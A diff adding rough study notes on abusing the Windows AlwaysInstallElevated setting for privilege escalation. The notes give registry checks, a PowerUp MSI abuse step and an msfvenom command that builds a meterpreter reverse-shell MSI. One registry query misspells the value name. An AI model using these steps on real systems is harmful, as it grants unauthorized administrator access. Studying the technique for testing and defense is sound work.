@@ -1,0 +1,45 @@
+
+Always Installed elevated : 
+
+There are packages for windows called msi packages and msi packages are windows installer and we have a registry feature where we can have this where packages are automaticallt installed elevated.this means these packages is installed elevated as a admin user . 
+
+if the value of AlwaysInstalledElevated = 1 we are gonna attack on this. 
+
+tool used : 	metasploit 
+		autowin 
+
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevate
+
+Now we if the value comes out to be 1 we have to abuse this 
+
+[*] Checking for AlwaysInstallElevated registry key...
+
+
+OutputFile    :
+AbuseFunction : Write-UserAddMSI
+
+Now in powershell run the Write-UserAddMSI 
+
+PS C:\PrivEsc> Write-UserAddMSI
+
+Now run the an executable is seen on the folder location : 
+
+this means as a admin we have installed this MSI : We installed elevated. 
+
+Payload making : 
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f msi -o setup.msi 
+
+Now transfer this file to windows machine and run this setup.msi 
+
+and you will get a user level shell and run 
+
+getuid 
+
+you will get the NT/AUTHORITY 
+
+
+
+
+
